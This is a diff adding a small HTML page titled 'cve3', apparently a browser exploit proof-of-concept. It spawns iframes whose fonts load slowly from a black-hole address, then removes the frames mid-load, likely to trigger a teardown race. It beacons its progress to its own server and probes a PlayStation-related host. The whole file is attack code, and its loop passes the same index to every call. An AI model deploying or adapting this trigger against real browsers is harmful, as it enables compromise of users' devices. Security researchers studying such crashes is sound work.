@@ -1,0 +1,50 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>cve3</title>
+<script>
+function b(tag){
+  var u = location.origin + '/beacon/CVE3-' + tag + '?t=' + Date.now();
+  try { var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); return; } catch(e){}
+  try { navigator.sendBeacon(u); } catch(e){}
+}
+b('S');
+var q = new URLSearchParams(location.search);
+var mode = q.get('t') || 'black';
+var SLOW = (mode === 'black')
+  ? 'https://192.0.2.1/f.ttf'
+  : location.origin + '/slowfont/f.ttf';
+b('MODE:' + mode + ':' + SLOW);
+
+// reachability probe: does the stall endpoint answer at all?
+(function(){
+  var im = new Image();
+  im.onload = function(){ b('REACH:load'); };
+  im.onerror = function(){ b('REACH:error'); };
+  im.src = 'https://manuals.playstation.net:8443/p.png?t=' + Date.now();
+})();
+
+var made = 0, removed = 0;
+function mkdoc(i){
+  return '<!doctype html><meta charset=utf-8><style>'
+    + '@font-face{font-family:slow;src:url(' + SLOW + '?n=' + i + '&ms=3000)}'
+    + 'body{font-family:slow;font-size:20px}'
+    + '</style><body>font load ' + i + '</body>';
+}
+function one(i){
+  var f = document.createElement('iframe');
+  f.style.width='200px'; f.style.height='80px';
+  f.srcdoc = mkdoc(i);
+  document.documentElement.appendChild(f);
+  made++;
+  setTimeout(function(){ try { f.remove(); removed++; } catch(e) {} }, 60 + (i % 10) * 50);
+}
+for (var i=0;i<20;i++) setTimeout(function(){ one(i); }, i*80);
+setTimeout(function(){ b('T05:made=' + made + ',removed=' + removed); }, 5000);
+setTimeout(function(){ b('T30'); }, 30000);
+setTimeout(function(){ b('T60'); }, 60000);
+setTimeout(function(){
+  b('DONE:made=' + made + ',removed=' + removed + ',kids=' + document.documentElement.childNodes.length);
+  setTimeout(function(){ location.replace('about:blank'); }, 200);
+}, 88000);
+</script>
+<p>cve3</p>
